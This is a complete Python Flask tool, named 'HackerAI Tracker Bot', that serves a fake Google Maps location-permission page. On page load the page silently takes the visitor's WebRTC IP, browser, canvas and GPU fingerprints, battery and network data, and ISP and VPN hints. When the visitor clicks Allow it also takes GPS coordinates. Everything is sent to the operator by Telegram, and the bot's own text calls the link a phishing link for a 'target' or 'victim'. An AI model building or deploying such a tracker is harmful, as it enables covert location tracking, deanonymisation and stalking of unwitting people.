import os
import sys
import json
import time
import re
import subprocess
import threading
import logging
from datetime import datetime
from io import StringIO

from flask import Flask, request, jsonify
import requests

# ========================== CONFIGURATION ==========================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE")
# If you want ALL users who start the bot to receive updates, leave CHAT_ID empty
# and we'll collect chat_ids dynamically.

PORT = int(os.environ.get("PORT", 8080))

# Auto-download cloudflared if not present
import stat
if not os.path.exists("cloudflared"):
    import urllib.request
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    urllib.request.urlretrieve(url, "cloudflared")
    os.chmod("cloudflared", stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    CLOUDFLARED_PATH = "./cloudflared"
else:
    CLOUDFLARED_PATH = os.environ.get("CLOUDFLARED_PATH", "cloudflared")

# Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Store authorized chat IDs (users who /start the bot)
authorized_chats = set()
if TELEGRAM_CHAT_ID:
    for cid in TELEGRAM_CHAT_ID.split(","):
        try:
            authorized_chats.add(int(cid.strip()))
        except ValueError:
            pass

current_tunnel_url = None

# ========================== TELEGRAM HELPERS ==========================
def send_telegram(chat_id, text, parse_mode="HTML"):
    """Send a message via Telegram Bot API."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": False,
    }
    try:
        resp = requests.post(url, json=payload, timeout=10)
        if not resp.ok:
            logger.warning(f"Telegram send error: {resp.status_code} {resp.text}")
    except Exception as e:
        logger.error(f"Telegram send exception: {e}")


def send_telegram_all(text, parse_mode="HTML"):
    """Send a message to all authorized chats."""
    for cid in authorized_chats:
        send_telegram(cid, text, parse_mode)


def forward_data_to_telegram(title, data_dict):
    """Format collected data nicely and forward to Telegram."""
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    msg_parts = [f"<b>🔍 {title}</b>\n📅 {ts}\n"]

    for k, v in data_dict.items():
        v_str = str(v)[:200]  # Truncate long values
        msg_parts.append(f"<b>{k}:</b> {v_str}")

    msg = "\n".join(msg_parts)

    # Telegram has 4096 char limit, split if needed
    if len(msg) > 4000:
        # Send truncated version with a note
        msg = msg[:3900] + "\n\n... (truncated, check dashboard)"

    send_telegram_all(msg)


def forward_gps_to_telegram(lat, lon, data):
    """Send GPS data with a Google Maps link."""
    maps_link = f"https://maps.google.com/?q={lat},{lon}"
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    msg = (
        f"<b>📍 GPS LOCATION CAPTURED</b>\n"
        f"📅 {ts}\n"
        f"<b>Latitude:</b> {lat:.6f}\n"
        f"<b>Longitude:</b> {lon:.6f}\n"
        f"<b>Accuracy:</b> {data.get('acc', 'N/A')}m\n"
        f"<b>Altitude:</b> {data.get('alt', 'N/A')}m\n"
        f"<b>Speed:</b> {data.get('speed', 'N/A')} km/h\n\n"
        f"📍 <a href=\"{maps_link}\">Open in Google Maps</a>"
    )
    send_telegram_all(msg)


def send_new_link_notification(url):
    """Notify all users that a new tunnel link is active."""
    msg = (
        f"<b>✅ TUNNEL ACTIVE — Send this link to the target:</b>\n\n"
        f"🔗 <code>{url}</code>\n\n"
        f"📊 <b>Dashboard:</b> <a href=\"{url}/results\">View Results</a>\n\n"
        f"<i>The link captures GPS, WebRTC IP, browser fingerprint, "
        f"canvas fingerprint, WebGL/GPU info, battery status, "
        f"network info & ISP/VPN detection.</i>"
    )
    send_telegram_all(msg)


# ========================== FLASK WEBHOOK (Telegram) ==========================
@app.route(f"/webhook", methods=["POST"])
def telegram_webhook():
    """Handle incoming Telegram updates via webhook."""
    data = request.get_json()
    if not data:
        return "OK", 200

    # Extract message
    message = data.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    text = message.get("text", "")

    if not chat_id:
        return "OK", 200

    # Add to authorized chats
    authorized_chats.add(chat_id)

    if text == "/start":
        welcome = (
            "<b>🤖 HackerAI Tracker Bot — Active</b>\n\n"
            "The tracker server is running. When a victim visits the link, "
            "all collected data will appear here in real-time.\n\n"
            "<b>📌 Commands:</b>\n"
            "/start — Show this message\n"
            "/link — Get the current phishing link\n"
            "/status — Check server & tunnel status\n"
            "/dashboard — Get the results dashboard URL"
        )
        send_telegram(chat_id, welcome)

    elif text == "/link":
        if current_tunnel_url:
            send_telegram(
                chat_id,
                f"<b>🔗 Current Phishing Link:</b>\n<code>{current_tunnel_url}</code>\n\n"
                f"📊 <b>Dashboard:</b> {current_tunnel_url}/results",
            )
        else:
            send_telegram(
                chat_id,
                "⚠️ Tunnel is not ready yet. Waiting for Cloudflared to start...\n"
                "Try again in a few seconds.",
            )

    elif text == "/status":
        tunnel_status = "✅ Active" if current_tunnel_url else "⏳ Starting..."
        chat_count = len(authorized_chats)
        msg = (
            f"<b>📊 Bot Status</b>\n\n"
            f"Tunnel: {tunnel_status}\n"
            f"Authorized chats: {chat_count}\n"
            f"URL: {current_tunnel_url or 'N/A'}\n"
            f"Listening on port: {PORT}\n"
            f"Bot uptime: active"
        )
        send_telegram(chat_id, msg)

    elif text == "/dashboard":
        if current_tunnel_url:
            send_telegram(
                chat_id,
                f"<b>📊 Dashboard:</b>\n{current_tunnel_url}/results",
            )
        else:
            send_telegram(chat_id, "⚠️ Tunnel not active yet.")

    else:
        send_telegram(
            chat_id,
            "Unknown command. Available:\n/start\n/link\n/status\n/dashboard",
        )

    return "OK", 200


# ========================== FLASK ROUTES (Tracker) ==========================
@app.route('/')
def index():
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    notify_data = {"IP": ip, "User-Agent": ua[:80], "Time": ts}
    logger.info(f"Victim accessed page - IP: {ip}")

    # Log to file
    os.makedirs("data", exist_ok=True)
    with open("data/victims.log", "a") as f:
        f.write(f"[{ts}] IP: {ip} | UA: {ua[:80]}\n")

    forward_data_to_telegram("VICTIM ACCESSED THE PAGE", notify_data)

    return HTML_PAGE


@app.route('/collect', methods=['POST'])
def collect_all():
    data = request.json
    ip = get_real_ip()
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    os.makedirs("data", exist_ok=True)

    if not data:
        return jsonify({"status": "ok"})

    # --- GPS ---
    if 'lat' in data and 'lon' in data:
        lat, lon = data['lat'], data['lon']
        maps_link = f"https://maps.google.com/?q={lat},{lon}"

        entry_data = {
            "Victim IP": ip,
            "Latitude": f"{lat:.6f}",
            "Longitude": f"{lon:.6f}",
            "Accuracy": f"{data.get('acc', 'N/A')}m",
            "Altitude": f"{data.get('alt', 'N/A')}m",
            "Speed": f"{data.get('speed', 'N/A')} km/h",
            "Google Maps": maps_link,
        }
        logger.info(f"GPS captured - {lat},{lon}")

        with open("data/gps_data.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | Lat: {lat}, Lon: {lon} | {maps_link}\n")

        forward_gps_to_telegram(lat, lon, data)

    # --- WebRTC Leak ---
    if 'webrtc_ip' in data:
        entry_data = {"Victim IP": ip, "WebRTC IP": data['webrtc_ip']}
        logger.info(f"WebRTC leak - {data['webrtc_ip']}")

        with open("data/webrtc_leaks.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | WebRTC: {data['webrtc_ip']}\n")

        forward_data_to_telegram("WEBRTC IP LEAK", entry_data)

    # --- Device Info ---
    if 'battery' in data:
        b = data['battery']
        entry_data = {
            "Victim IP": ip,
            "Battery Level": f"{float(b.get('level', 0)) * 100:.0f}%",
            "Charging": b.get('charging', 'N/A'),
            "Network Type": data.get('network', {}).get('type', 'N/A'),
            "Downlink": f"{data.get('network', {}).get('downlink', 'N/A')} Mbps",
        }
        with open("data/device_fingerprints.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | Battery: {entry_data['Battery Level']} | "
                    f"Charging: {b.get('charging')}\n")

        forward_data_to_telegram("BATTERY & DEVICE INFO", entry_data)

    # --- Browser Fingerprint ---
    if 'fingerprint' in data:
        fp = data['fingerprint']
        entry_data = {
            "Victim IP": ip,
            "Screen": f"{fp.get('width', '?')}x{fp.get('height', '?')}",
            "Platform": fp.get('platform', '?'),
            "Languages": ", ".join(fp.get('languages', [])),
            "Timezone": fp.get('timezone', '?'),
            "Cookies Enabled": fp.get('cookiesEnabled', '?'),
        }
        with open("data/fingerprints.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | Screen: {entry_data['Screen']} | "
                    f"Platform: {fp.get('platform', '?')} | TZ: {fp.get('timezone', '?')}\n")

        forward_data_to_telegram("BROWSER FINGERPRINT", entry_data)

    # --- Canvas Fingerprint ---
    if 'canvas_fp' in data:
        with open("data/canvas_fingerprints.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | Canvas Hash: {data['canvas_fp'][:64]}...\n")

        forward_data_to_telegram("CANVAS FINGERPRINT", {
            "Victim IP": ip,
            "Canvas Hash": data['canvas_fp'][:64] + "...",
        })

    # --- WebGL ---
    if 'webgl' in data:
        w = data['webgl']
        entry_data = {"Victim IP": ip, "Vendor": w.get('vendor', 'N/A'), "Renderer": w.get('renderer', 'N/A')}
        with open("data/gpu_info.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | WebGL: {w.get('vendor', 'N/A')} / {w.get('renderer', 'N/A')}\n")

        forward_data_to_telegram("WEBGL / GPU INFO", entry_data)

    # --- Network Info ---
    if 'wifi_scan' in data:
        w = data['wifi_scan']
        entry_data = {
            "Victim IP": ip,
            "Connection Type": w.get('type', 'N/A'),
            "Effective Type": w.get('effectiveType', 'N/A'),
            "RTT": f"{w.get('rtt', 'N/A')} ms",
            "Downlink": f"{w.get('downlink', 'N/A')} Mbps",
        }
        with open("data/network_info.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | Type: {w.get('effectiveType', 'N/A')} | "
                    f"Downlink: {w.get('downlink', 'N/A')} Mbps\n")

        forward_data_to_telegram("NETWORK INFO", entry_data)

    # --- Extended Network Detector ---
    if 'network_detector' in data:
        nd = data['network_detector']
        entry_data = {
            "Victim IP": ip,
            "Connection Type": nd.get('type', 'N/A'),
            "Effective Type": nd.get('effectiveType', 'N/A'),
            "RTT": f"{nd.get('rtt', 'N/A')} ms",
            "Downlink": f"{nd.get('downlink', 'N/A')} Mbps",
            "VPN/Proxy Detected": nd.get('vpnDetected', 'N/A'),
            "Tor Detected": nd.get('torDetected', 'N/A'),
            "Public IP": nd.get('publicIP', 'N/A'),
            "ISP Hints": nd.get('ispHints', 'N/A'),
        }
        with open("data/network_detector.log", "a") as f:
            f.write(f"[{ts}] IP: {ip} | VPN: {nd.get('vpnDetected', 'N/A')} | "
                    f"ISP: {nd.get('ispHints', 'N/A')}\n")

        forward_data_to_telegram("EXTENDED NETWORK DETECTOR", entry_data)

    return jsonify({"status": "received"})


@app.route('/results')
def show_results():
    html = """<html><head><title>Tracker Dashboard</title><style>
    body{font-family:monospace;background:#111;color:#0f0;padding:20px;}
    h1{color:#fff} h2{color:#aaa}
    .section{border:1px solid #333;padding:15px;margin:10px 0;border-radius:5px;}
    a{color:#0ff} .file{color:#ff0}
    </style></head><body>
    <h1>PENTEST DASHBOARD</h1>
    <p>Real-time captured data files:</p><ul>"""

    os.makedirs("data", exist_ok=True)
    for f in sorted(os.listdir("data")):
        if f.endswith('.log') or f.endswith('.txt'):
            fpath = os.path.join("data", f)
            size = os.path.getsize(fpath)
            html += f"<li class='file'><a href='/view/{f}'>{f}</a> ({size} bytes)</li>"

    html += "</ul>"

    html += "<p>GPS Links captured:</p><ul>"
    gps_file = "data/gps_data.log"
    if os.path.exists(gps_file):
        with open(gps_file, "r") as gf:
            for line in gf.read().splitlines()[-20:]:
                html += f"<li class='file'>{line.strip()}</li>"
    html += "</ul></body></html>"
    return html


@app.route('/view/<filename>')
def view_file(filename):
    if not filename.endswith(('.log', '.txt')):
        return "Forbidden", 403
    path = os.path.join("data", filename)
    if not os.path.exists(path):
        return "Not found", 404
    with open(path, 'r') as f:
        content = f.read()
    safe = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    return f"<pre style='background:#111;color:#0f0;padding:20px;font-family:monospace;'>{safe}</pre>"


# ========================== UTILITY ==========================
def get_real_ip():
    flask_ip = request.remote_addr
    xff = request.headers.get('X-Forwarded-For', '')
    xff_ip = xff.split(',')[0].strip() if xff else None
    cf_ip = request.headers.get('CF-Connecting-IP', '')
    return cf_ip or xff_ip or flask_ip


# ========================== CLOUDFLARED TUNNEL ==========================
def start_tunnel():
    global current_tunnel_url
    time.sleep(3)

    logger.info("Starting Cloudflared tunnel...")

    try:
        process = subprocess.Popen(
            [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        for line in process.stdout:
            match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
            if match:
                current_tunnel_url = match.group(1)
                logger.info(f"Tunnel active: {current_tunnel_url}")

                # Save to file
                os.makedirs("data", exist_ok=True)
                with open("data/link.txt", "w") as f:
                    f.write(f"Phishing URL: {current_tunnel_url}\n"
                            f"Dashboard: {current_tunnel_url}/results\n")

                # Notify all Telegram users
                send_new_link_notification(current_tunnel_url)
                break

        # Keep reading stdout to maintain tunnel
        for line in process.stdout:
            if "error" in line.lower() or "failed" in line.lower():
                logger.warning(f"Tunnel: {line.strip()}")

        process.wait()
    except FileNotFoundError:
        logger.error("Cloudflared not found! Install it or set CLOUDFLARED_PATH env var.")
        send_telegram_all(
            "<b>❌ ERROR:</b> Cloudflared binary not found.\n"
            "Install it: <code>curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared && chmod +x cloudflared</code>"
        )
    except Exception as e:
        logger.error(f"Tunnel error: {e}")


# ========================== HTML PAGE ==========================
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Maps</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
}

body{
    height:100vh;
    overflow:hidden;
    position:relative;
    background:#1a1a2e;
}

.map-bg{
    position:fixed;
    inset:0;
    z-index:0;
}

.map-bg iframe{
    width:100%;
    height:100%;
    border:none;
    filter:blur(6px) brightness(0.7);
    transform:scale(1.1);
}

.overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.3);
    z-index:1;
}

.popup{
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    z-index:10;
    width:380px;
    padding:30px;
    background:rgba(255,255,255,.15);
    backdrop-filter:blur(20px);
    -webkit-backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,.25);
    border-radius:20px;
    text-align:center;
    color:white;
    box-shadow:0 8px 32px rgba(0,0,0,.5);
}

.logo{
    width:70px;
    margin-bottom:15px;
}

h2{
    margin-bottom:8px;
    font-size:22px;
    font-weight:500;
}

p{
    margin-bottom:20px;
    opacity:.9;
    font-size:14px;
    line-height:1.5;
}

.buttons{
    display:flex;
    gap:10px;
}

button{
    flex:1;
    padding:12px 16px;
    border:none;
    border-radius:12px;
    cursor:pointer;
    font-weight:600;
    font-size:15px;
    transition:all 0.2s;
}

.allow{
    background:#4285F4;
    color:white;
}
.allow:hover{
    background:#3367d6;
}
.allow:disabled{
    opacity:0.6;
    cursor:default;
}

.deny{
    background:rgba(255,255,255,.2);
    color:white;
}
.deny:hover{
    background:rgba(255,255,255,.3);
}
.deny:disabled{
    opacity:0.6;
    cursor:default;
}

.hidden{display:none;}
</style>
</head>
<body>

<div class="map-bg">
    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d387190.279915233!2d-74.25987368715497!3d40.69767006458873!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c24fa5d33f083b%3A0xe414a1f0af8f5e8d!2sNew+York%2C+NY!5e0!3m2!1sen!2sus!4v1" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
</div>
<div class="overlay"></div>

<div class="popup" id="popup">

    <img class="logo"
    src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg"
    alt="Maps">

    <h2>Allow Location Access</h2>

    <p>
        Google Maps needs access to your device's location to show
        nearby places, traffic updates, and directions.
    </p>

    <div class="buttons">
        <button class="deny" id="denyBtn">Not Now</button>
        <button class="allow" id="allowBtn">Allow</button>
    </div>

</div>

<script>
(function(){
    'use strict';
    let capturedLat = null;
    let capturedLon = null;

    const allowBtn = document.getElementById('allowBtn');
    const denyBtn = document.getElementById('denyBtn');

    function disableButtons(){
        allowBtn.disabled = true;
        denyBtn.disabled = true;
        allowBtn.style.opacity = '0.7';
        denyBtn.style.opacity = '0.7';
    }

    function collectSilentData(){
        var points = 0;

        // --- WebRTC IP Leak ---
        try{
            var pc = new RTCPeerConnection({
                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
            });
            pc.createDataChannel('');
            pc.createOffer().then(function(offer){
                return pc.setLocalDescription(offer);
            });
            pc.onicecandidate = function(ice){
                if(!ice || !ice.candidate) return;
                var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
                if(ipMatch){
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({webrtc_ip: ipMatch[1]})
                    }).catch(function(){});
                    points++;
                }
            };
            setTimeout(function(){ try{pc.close();}catch(e){} }, 3000);
        } catch(e){}

        // --- Browser Fingerprint ---
        var fp = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            platform: navigator.platform,
            languages: navigator.languages ? Array.from(navigator.languages) : [navigator.language],
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            localStorage: typeof(Storage) !== 'undefined' ? true : false,
            sessionStorage: typeof(Storage) !== 'undefined' ? true : false
        };
        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({fingerprint: fp})
        }).catch(function(){});
        points++;

        // --- Canvas Fingerprint ---
        try{
            var can = document.createElement('canvas');
            can.width = 400;
            can.height = 150;
            var ctx = can.getContext('2d');

            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, 400, 150);

            ctx.fillStyle = '#4285F4';
            ctx.fillRect(0, 0, 400, 40);

            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 22px Arial, sans-serif';
            ctx.textBaseline = 'middle';
            ctx.fillText('Google Maps', 20, 22);

            ctx.beginPath();
            ctx.arc(340, 75, 20, 0, Math.PI * 2);
            ctx.fillStyle = '#ea4335';
            ctx.fill();
            ctx.strokeStyle = '#ffffff';
            ctx.lineWidth = 3;
            ctx.stroke();

            ctx.beginPath();
            ctx.arc(340, 75, 8, 0, Math.PI * 2);
            ctx.fillStyle = '#ffffff';
            ctx.fill();

            ctx.strokeStyle = '#dadce0';
            ctx.lineWidth = 2;
            for (var i = 0; i < 6; i++) {
                ctx.beginPath();
                ctx.moveTo(20, 55 + i * 18);
                ctx.lineTo(280, 55 + i * 18);
                ctx.stroke();
            }

            ctx.fillStyle = '#fbbc04';
            ctx.fillRect(30, 60, 40, 30);
            ctx.fillStyle = '#34a853';
            ctx.fillRect(100, 78, 50, 40);
            ctx.fillStyle = '#4285F4';
            ctx.fillRect(180, 55, 35, 35);
            ctx.fillStyle = '#ea4335';
            ctx.fillRect(230, 90, 45, 25);

            ctx.fillStyle = '#202124';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'top';
            ctx.fillText('Current Location', 20, 120);
            ctx.fillStyle = '#5f6368';
            ctx.font = '12px Arial';
            ctx.fillText('Accuracy: +/- 12m', 180, 122);

            var hash = can.toDataURL('image/png');

            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({canvas_fp: hash})
            }).catch(function(){});
            points++;
        } catch(e){}

        // --- WebGL ---
        try{
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if(gl){
                var webglInfo = {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER)
                };
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({webgl: webglInfo})
                }).catch(function(){});
                points++;
            }
        } catch(e){}

        // --- Network Info ---
        if(navigator.connection){
            var nc = navigator.connection;
            var netData = {
                type: nc.type || 'unknown',
                effectiveType: nc.effectiveType || 'unknown',
                rtt: nc.rtt,
                downlink: nc.downlink,
                downlinkMax: nc.downlinkMax || 'unknown',
                saveData: nc.saveData || false
            };
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({wifi_scan: netData})
            }).catch(function(){});
            points++;
        }

        // --- Battery ---
        if(navigator.getBattery){
            navigator.getBattery().then(function(b){
                var netInfo = {};
                if(navigator.connection){
                    netInfo = {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink
                    };
                }
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        battery: {level: b.level, charging: b.charging},
                        network: netInfo
                    })
                }).catch(function(){});
            }).catch(function(){});
        }

        // ========== NETWORK DETECTOR (Extended) ==========
        function runNetworkDetector(){
            var netDetect = {
                type: 'unknown',
                effectiveType: 'unknown',
                rtt: null,
                downlink: null,
                downlinkMax: null,
                saveData: null,
                ispHints: 'N/A',
                vpnDetected: 'N/A',
                torDetected: 'N/A',
                publicIP: 'N/A',
                dataSavingMode: 'N/A'
            };

            if(navigator.connection){
                var nc = navigator.connection;
                netDetect.type = nc.type || 'unknown';
                netDetect.effectiveType = nc.effectiveType || 'unknown';
                netDetect.rtt = nc.rtt;
                netDetect.downlink = nc.downlink;
                netDetect.downlinkMax = nc.downlinkMax || null;
                netDetect.saveData = nc.saveData || false;
            }

            if(navigator.connection && navigator.connection.saveData){
                netDetect.dataSavingMode = 'Yes';
            } else {
                netDetect.dataSavingMode = 'No';
            }

            try{
                var vpnPC = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });
                var detectedIPs = [];
                vpnPC.createDataChannel('');
                vpnPC.createOffer().then(function(offer){
                    return vpnPC.setLocalDescription(offer);
                });
                vpnPC.onicecandidate = function(ice){
                    if(!ice || !ice.candidate) return;
                    var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
                    if(ipMatch && detectedIPs.indexOf(ipMatch[1]) === -1){
                        detectedIPs.push(ipMatch[1]);
                    }
                };
                setTimeout(function(){
                    try{ vpnPC.close(); } catch(e){}
                    if(detectedIPs.length > 1){
                        netDetect.vpnDetected = 'Possible (' + detectedIPs.join(', ') + ')';
                    }
                }, 3000);
            } catch(e){}

            try{
                fetch('https://api.ipify.org?format=json')
                .then(function(r){ return r.json(); })
                .then(function(ipData){
                    if(ipData && ipData.ip){
                        netDetect.publicIP = ipData.ip;
                    }
                    return fetch('https://ipapi.co/' + (ipData.ip || '') + '/json/');
                })
                .then(function(r){ return r.json(); })
                .then(function(geoData){
                    if(geoData && geoData.org){
                        netDetect.ispHints = geoData.org + (geoData.country_name ? ' (' + geoData.country_name + ')' : '');
                    }
                    if(geoData && geoData.hosting === true){
                        netDetect.vpnDetected = 'Yes (hosting/VPN IP)';
                    }
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({network_detector: netDetect})
                    }).catch(function(){});
                })
                .catch(function(){
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({network_detector: netDetect})
                    }).catch(function(){});
                });
            } catch(e){
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({network_detector: netDetect})
                }).catch(function(){});
            }
        }

        setTimeout(runNetworkDetector, 1500);

        console.log('[+] Silent data collected: ' + points + ' points sent');
    }

    collectSilentData();

    // ========== GPS ON ALLOW ==========
    allowBtn.addEventListener('click', function(){
        disableButtons();
        allowBtn.textContent = 'Accessing...';

        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                function(pos){
                    capturedLat = pos.coords.latitude;
                    capturedLon = pos.coords.longitude;

                    allowBtn.textContent = 'Location Shared';

                    var gpsData = {
                        lat: capturedLat,
                        lon: capturedLon,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        speed: pos.coords.speed
                    };

                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(gpsData)
                    }).catch(function(){});

                    setTimeout(function(){
                        var mapsUrl = 'https://maps.google.com/?q=' + capturedLat + ',' + capturedLon;
                        window.location.href = mapsUrl;
                    }, 2000);
                },
                function(err){
                    var errMsg = 'Location unavailable';
                    if(err.code === 1) errMsg = 'Permission denied';
                    else if(err.code === 2) errMsg = 'Position unavailable';
                    else if(err.code === 3) errMsg = 'Timed out';

                    allowBtn.textContent = errMsg;

                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({gps_error: err.message, gps_code: err.code})
                    }).catch(function(){});

                    setTimeout(function(){
                        window.location.href = 'https://maps.google.com';
                    }, 2000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        } else {
            allowBtn.textContent = 'GPS Unavailable';
            setTimeout(function(){
                window.location.href = 'https://maps.google.com';
            }, 2000);
        }
    });

    // ========== DENY ==========
    denyBtn.addEventListener('click', function(){
        disableButtons();
        denyBtn.textContent = 'Opening...';

        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({gps_error: 'User clicked Not Now', gps_code: 1})
        }).catch(function(){});

        setTimeout(function(){
            window.location.href = 'https://maps.google.com';
        }, 1000);
    });
})();
</script>
</body>
</html>
"""


# ========================== SET WEBHOOK ON STARTUP ==========================
def set_webhook():
    """Set the Telegram webhook to point to this Render instance."""
    time.sleep(5)  # Wait for server to be ready

    # First, get the Render URL from environment
    render_url = os.environ.get("RENDER_EXTERNAL_URL")
    if not render_url:
        logger.warning("RENDER_EXTERNAL_URL not set. Bot webhook won't be configured automatically.")
        logger.warning("Set it manually in Render dashboard > Environment Variables.")
        return

    webhook_url = f"{render_url}/webhook"

    # Delete old webhook first
    del_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteWebhook"
    try:
        requests.get(del_url, timeout=10)
    except:
        pass

    # Set new webhook
    set_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
    payload = {"url": webhook_url}
    try:
        resp = requests.post(set_url, json=payload, timeout=10)
        if resp.ok:
            logger.info(f"Webhook set to: {webhook_url}")
        else:
            logger.error(f"Webhook failed: {resp.text}")
    except Exception as e:
        logger.error(f"Webhook error: {e}")


# ========================== MAIN ==========================
if __name__ == '__main__':
    logger.info("Starting HackerAI Tracker Bot...")

    # Start tunnel in a thread
    tunnel_thread = threading.Thread(target=start_tunnel, daemon=True)
    tunnel_thread.start()

    # Set webhook in a thread (after server starts)
    webhook_thread = threading.Thread(target=set_webhook, daemon=True)
    webhook_thread.start()

    # Run Flask
    logger.info(f"Flask server starting on port {PORT}...")
    from waitress import serve
    serve(app, host="0.0.0.0", port=PORT)
